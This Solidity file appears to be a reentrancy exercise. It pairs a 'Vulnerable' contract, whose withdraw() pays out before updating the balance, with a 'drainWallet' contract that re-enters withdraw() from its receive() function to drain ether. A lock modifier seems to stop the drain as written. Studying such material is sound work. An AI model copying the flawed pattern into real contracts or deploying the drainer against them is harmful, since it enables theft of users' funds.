// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;



contract Vulnerable {
    mapping (address => uint) public balanceOf;
    bool internal locked;
    address public nuld = address(0);


    constructor() payable {
        require(msg.value >= 10 ether,"NOPE!!!!");
        balanceOf[address(0)] = msg.value;
    }

    modifier  NoLocked(){
        require(!locked, "No! No!");
        locked=true;
        _;
        locked=false;
    }

    function deposit() external payable {
        require(msg.value>0,"NOPE!!");
        balanceOf[msg.sender]+=msg.value;
    }


    function withdraw(uint amount) external NoLocked{
        uint balance = balanceOf[msg.sender];
        require(balance>=amount,"BROKE!!");
        (bool success,) =  msg.sender.call{value:amount}("");
        require(success,"OOOPPPSSS!!");
        balanceOf[msg.sender]-=amount;
    }


    receive() external payable { }
    fallback() external payable { }
}


 contract drainWallet{
      Vulnerable public vulnerable;
    
    constructor(address payable _vulnerableAddress) payable {
        require(msg.value > 0, "Send some ETH");
        vulnerable = Vulnerable(_vulnerableAddress);
    }
  
    function infiltrateVunarableAccount() external  payable {
        // require(msg.value >= 1 ether, "Fund wallet");
        require(address(this).balance >= 1 ether, "Not enough ETH in contract");

         vulnerable.deposit{value: msg.value}();

         vulnerable.withdraw(1 ether);
    }

    receive() external payable { 
        uint balance = address(vulnerable).balance;
        if(balance >= 1 ether){
            vulnerable.withdraw(1 ether);
        }
    }
    function getBalance() public view returns (uint) {
         return address(this).balance;
    }
 }

 contract Calls{
    // receive() external payable { }
    fallback () external payable {}
 }